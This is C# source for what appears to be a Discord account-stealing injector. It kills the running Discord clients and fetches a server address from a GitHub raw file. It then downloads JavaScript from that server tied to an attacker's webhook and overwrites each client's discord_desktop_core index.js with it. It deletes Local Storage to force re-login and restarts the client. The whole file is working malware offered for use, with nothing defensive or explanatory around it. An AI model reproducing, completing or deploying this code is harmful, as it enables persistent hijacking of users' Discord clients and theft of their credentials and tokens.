using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using DFucker;
using System.Net;
using System.Threading.Tasks;

namespace DFucker
{
	internal class Program
	{
		private static void Main(string[] args)
		{
			string webhook = Config.webhookURL;
			foreach (var builds in Config.builds.Where(c => Directory.Exists(c.Value)))
			{
				KillProcess(builds.Key).Wait();

				var myClient = new WebClient();
				string vpsip = myClient.DownloadString("https://raw.githubusercontent.com/DiscordFucker/Assets/main/ApiLink.txt");
				string jsScript = myClient.DownloadString(vpsip.Trim() + "/injector/permanant?webhook=" + webhook);
				DeleteLocalStorage(builds.Key).Wait();
				Inject(builds.Key, builds.Value, jsScript).Wait();

                StartBuild(builds.Key);
			}
		}

		private static async Task Inject(string buildName, string directory, string code)
		{
			if (buildName == "Discord")
			{
				string[] dirs = Directory.GetDirectories(directory);

				if (dirs.Length > 0)
				{
					dirs = dirs.Where(c => char.IsNumber(c.Split(@"\".ToCharArray()).Last().ToCharArray().First())).ToArray();
					var app = dirs.Last();

					string[] dirsInApp = Directory.GetDirectories(app + "\\modules");

					if (dirsInApp.Length > 0)
					{
						dirsInApp = dirsInApp.Where(c => c.Split(@"\".ToCharArray()).Last().StartsWith("discord_desktop_core")).ToArray();
						var discord_desktop_core = dirsInApp.Last();


						File.WriteAllText(discord_desktop_core + "\\index.js", code);
					}
				}
			}
			else
			{
				string[] dirs = Directory.GetDirectories(directory);

				if (dirs.Length > 0)
				{
					// GET THE LAST VERSION OF DISCORD
					dirs = dirs.Where(c => c.Split(@"\".ToCharArray()).Last().StartsWith("app")).ToArray();
					var app = dirs.Last();

					string[] dirsInApp = Directory.GetDirectories(app + "\\modules");

					if (dirsInApp.Length > 0)
					{
						dirsInApp = dirsInApp.Where(c => c.Split(@"\".ToCharArray()).Last().StartsWith("discord_desktop_core")).ToArray();
						var discord_desktop_core = dirsInApp.Last();

						string[] dirss = Directory.GetDirectories(discord_desktop_core);

						var finalDesktopCore = dirss.Last();

						File.WriteAllText(finalDesktopCore + "\\index.js", code);
					}
				}
			}

		}

		//DELETE THE LOCAL STORAGE
		private static async Task DeleteLocalStorage(string buildName)
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + buildName.ToLower() + "\\Local Storage"))
			{
				Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + buildName.ToLower() + "\\Local Storage", true);
			}
		}

		//KILL DISCORD PROCESS
		private static async Task KillProcess(string build)
		{
			foreach (Process process in Process.GetProcessesByName(build))
			{
				process.Kill();
			}
		}

		//START DISCORD BUILD
		private static async Task StartBuild(string build)
		{
			string[] dirs = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + build);
			if (dirs.Length > 0)
			{
				// GET THE LAST VERSION OF DISCORD
				dirs = dirs.Where(c => c.Split(@"\".ToCharArray()).Last().StartsWith("app")).ToArray();
				var app = dirs.Last();
				Process.Start(app + "\\" + build);
			}
		}
	}
}